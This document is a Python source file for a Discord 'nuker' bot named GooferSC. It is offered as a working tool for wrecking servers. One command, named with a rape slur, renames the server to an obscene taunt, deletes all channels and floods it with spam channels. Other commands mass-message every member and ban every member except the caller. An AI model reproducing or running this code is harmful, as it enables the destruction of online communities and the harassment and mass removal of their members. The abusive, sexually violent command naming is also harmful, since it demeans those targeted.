# GooferSC 2021
# nootjack 2021 MIT license
# notjack 2021
# GoofyBot branches



# Put your bots token BELOW

TOKEN = ""

# Put your bots token ABOVE

import discord
from discord.ext import commands


intents = discord.Intents().all()
bot = commands.Bot(command_prefix=".", intents=intents)


@bot.command(brief="Bye bye server!")
async def rape(ctx, arg1, arg2):

    # Changes Server Name

    print("Attempting server rename...")

    try:

        await ctx.guild.edit(name="Fucked by GooferSC")

        print("[OK] Completed")

    except:

        print("[FAIL] UNKNOWN ERROR")

    # Deletes Every Channel

    print("Attempting delete all channels...")

    try:

        for c in ctx.guild.channels: # cycles through channels

            await c.delete()

            guild = ctx.message.guild # guild = server

        print("[OK] Completed")

    except:

        print("[FAIL] UNKNOWN ERROR")

    print("Attempting create channels...")

    try:

        for x in range(int(arg1)):

            # creates channels

            await guild.create_text_channel(arg2)

        print("[OK] Completed")

    except:

        print("[FAIL] UNKOWN ERROR")


# Changes Server Name

@bot.command(brief="Change server name.")
async def servername(ctx, *args):

    print("Attempting server rename...")

    response = " "

    for arg in args:
        response = response + " " + arg

    await ctx.guild.edit(name=response)

# Messages All

@bot.command(brief="Messages everyone.")
async def mall(ctx, *args):

    print("Attempting message all...")

    response = " "

    for arg in args:
        response = response + " " + arg

    print("Sending to all server members: " + response)

    for member in ctx.message.guild.members:
        try:

            await member.send(response)
            print("[OK] Messaged " + str(member))

        except:
            print("[FAIL] We're having trouble sending messages to " + str(member) + ". They have DMs turned off or aren't a real person (a bot).")

@bot.command()
async def ball(ctx):

    print("Attempting ban all...")

    for member in ctx.message.guild.members:
        try:

            if member == ctx.message.author:
                print("[EXC] Skipped banning " + str(member))
            else:
                await member.ban(reason="Banned by GooferSC")
                print("[OK] Banned " + str(member))

        except:
            print("[FAIL] We can't ban " + str(member))

bot.run(TOKEN)
